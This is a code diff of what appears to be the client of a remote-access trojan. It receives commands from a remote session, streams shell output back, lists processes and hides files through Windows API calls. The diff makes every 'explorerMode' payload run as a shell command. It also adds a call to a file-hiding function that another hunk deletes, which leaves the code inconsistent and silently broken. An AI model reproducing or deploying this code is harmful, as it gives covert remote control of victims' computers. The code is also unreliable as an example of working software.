@@ -158,11 +158,17 @@ while 1:
                         except:
                             pass
                         output = get_content()
+                    elif self.data['mode'] == 'explorerMode' and self.data['payload'].startswith('setHidden '):
+                        try:
+                            set_content_attribute(self.data['payload'].split()[-1])
+                        except:
+                            pass
                     # List Directory
-                    elif self.data['mode'] == 'explorerMode' and self.data['payload'] == 'getContent':
+                    elif self.data['mode'] == 'explorerMode':
+                        execproc = subprocess.Popen(self.data['payload'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        execproc.communicate()
                         data_send(get_content(), mode=self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
                         return
-
                     # Execute Script
                     elif self.data['mode'] == 'scriptingMode':
                         mprint = ''
@@ -703,7 +709,6 @@ while 1:
                     try:
                         execproc = subprocess.Popen(cmde, shell=True,
                                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        #cmdoutput = execproc.stdout.read() + execproc.stderr.read()
                         for line in iter(execproc.stdout.readline, ''):
                             data_send(line, 'shellMode')
                             time.sleep(0.5)
@@ -722,13 +727,6 @@ while 1:
                 except (AttributeError, AssertionError):
                     result = False
                 return result
-
-            # Set Hidden Attribute
-            def set_content_attribute(filepath):
-                if has_hidden_attribute:
-                    Kernel32.SetFileAttributesW(filepath, 1)
-                else:
-                    Kernel32.SetFileAttributesW(filepath, 2)
 
             # Get Processes
             def get_processes_list():
